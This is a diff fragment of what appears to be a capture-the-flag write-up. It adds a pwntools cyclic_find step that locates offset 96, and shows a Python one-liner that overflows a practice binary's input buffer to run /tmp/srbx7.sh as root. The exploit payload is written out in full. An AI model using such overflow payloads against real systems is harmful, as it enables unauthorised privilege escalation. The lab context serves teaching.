@@ -142,6 +142,11 @@ Command: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraa
 0xffffdc6c:	0x61616179
 ```
 
+```python
+cyclic_find(0x61616179)
+96
+```
+
 ```bash
 level2@lxc-pwn-x86:/levels$ python -c 'print "nobody\nKsdkjkk32avsh\n" + "/tmp/srbx7.sh\x00" + "\x90" * (96-len("/tmp/srbx7.sh0")) + "root\x00"'| ./level2 
 Username: Password: Command: Good job!
